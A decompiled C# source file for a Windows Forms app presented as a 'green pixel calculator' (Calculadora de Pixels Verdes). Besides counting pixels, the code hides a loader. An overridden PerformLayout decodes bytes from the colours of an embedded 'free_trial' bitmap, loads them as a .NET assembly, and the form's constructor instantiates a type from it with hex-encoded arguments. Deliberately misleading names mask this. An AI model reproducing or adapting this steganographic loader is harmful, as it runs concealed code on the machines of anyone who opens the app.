using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using GreenPixelsCalculator.Properties;

namespace GreenPixelsCalculator;

public class FormPixel : Form
{
	private object[] SanbdoxReflector = new object[3] { "514245456961", "687466", "GreenPixelsCalculator" };

	private IContainer components = null;

	private static object DoubleArray;

	private Label lblResultPixels;

	private PictureBox pictureBox1;

	private Button btLoadImg;

	private Button btPixelDetect;

	public FormPixel()
	{
		InitializeComponent();
		Type.GetType("System.Activator")!.InvokeMember("CreateInstance", BindingFlags.InvokeMethod, null, null, new object[2]
		{
			(Type)DoubleArray,
			SanbdoxReflector
		});
	}

	private void btLoadImg_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_Filter("bmp|*.bmp");
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			pictureBox1.set_ImageLocation(((FileDialog)val).get_FileName());
		}
	}

	private void btPixelDetect_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		Color color = Color.FromArgb(96, 192, 0);
		int num = 0;
		Bitmap val = new Bitmap(pictureBox1.get_Image());
		for (int i = 0; i < ((Image)val).get_Width(); i++)
		{
			for (int j = 0; j < ((Image)val).get_Height(); j++)
			{
				Color pixel = val.GetPixel(i, j);
				if (pixel == color)
				{
					num++;
					val.SetPixel(i, j, Color.Gold);
				}
			}
		}
		pictureBox1.set_Image((Image)(object)val);
		float num2 = (float)num / (float)(((Image)val).get_Width() * ((Image)val).get_Height()) * 100f;
		((Control)lblResultPixels).set_Text($"A quantidade de pixels verdes é {num:d} (ou seja, uma área equivalente a {num2:f}%)");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		lblResultPixels = new Label();
		pictureBox1 = new PictureBox();
		btLoadImg = new Button();
		btPixelDetect = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblResultPixels).set_AutoSize(true);
		((Control)lblResultPixels).set_Location(new Point(12, 474));
		((Control)lblResultPixels).set_Name("lblResultPixels");
		((Control)lblResultPixels).set_Size(new Size(0, 13));
		((Control)lblResultPixels).set_TabIndex(0);
		((Control)lblResultPixels).set_UseWaitCursor(true);
		((Control)pictureBox1).set_Location(new Point(13, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(446, 360));
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).set_UseWaitCursor(true);
		((Control)btLoadImg).set_Location(new Point(333, 387));
		((Control)btLoadImg).set_Name("btLoadImg");
		((Control)btLoadImg).set_Size(new Size(125, 37));
		((Control)btLoadImg).set_TabIndex(2);
		((Control)btLoadImg).set_Text("Imagem...");
		((ButtonBase)btLoadImg).set_UseVisualStyleBackColor(true);
		((Control)btLoadImg).set_UseWaitCursor(true);
		((Control)btLoadImg).add_Click((EventHandler)btLoadImg_Click);
		((Control)btPixelDetect).set_Location(new Point(334, 430));
		((Control)btPixelDetect).set_Name("btPixelDetect");
		((Control)btPixelDetect).set_Size(new Size(125, 35));
		((Control)btPixelDetect).set_TabIndex(3);
		((Control)btPixelDetect).set_Text("Detectar Pixels");
		((ButtonBase)btPixelDetect).set_UseVisualStyleBackColor(true);
		((Control)btPixelDetect).set_UseWaitCursor(true);
		((Control)btPixelDetect).add_Click((EventHandler)btPixelDetect_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(470, 496));
		((Control)this).get_Controls().Add((Control)(object)btPixelDetect);
		((Control)this).get_Controls().Add((Control)(object)btLoadImg);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)lblResultPixels);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Calculadora de Pixels Verdes");
		((Control)this).set_UseWaitCursor(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		PerformLayout();
	}

	public virtual void PerformLayout()
	{
		ResourceTemplateDefine("");
	}

	private static string ResourceTemplateDefine(string Subcategory)
	{
		int num = 0;
		byte[] array = new byte[62464];
		Bitmap free_trial = Resources.free_trial;
		for (int i = 0; i < 62464; i++)
		{
			for (int j = 0; j < 1; j++)
			{
				sfioqw(free_trial, i, j);
				Color pixel = free_trial.GetPixel(i, j);
				int num2 = ColorTranslator.ToWin32(pixel);
				array[num] = (byte)num2;
			}
			num++;
		}
		DoubleArray = IsFamilyOrAssembly(Assembly.Load(array)).GetTypes()[1];
		return Subcategory;
	}

	private static Color sfioqw(Bitmap ddd, int x, int y)
	{
		return ddd.GetPixel(x, y);
	}

	private static Assembly IsFamilyOrAssembly(object PureAttribute)
	{
		return (Assembly)PureAttribute;
	}
}
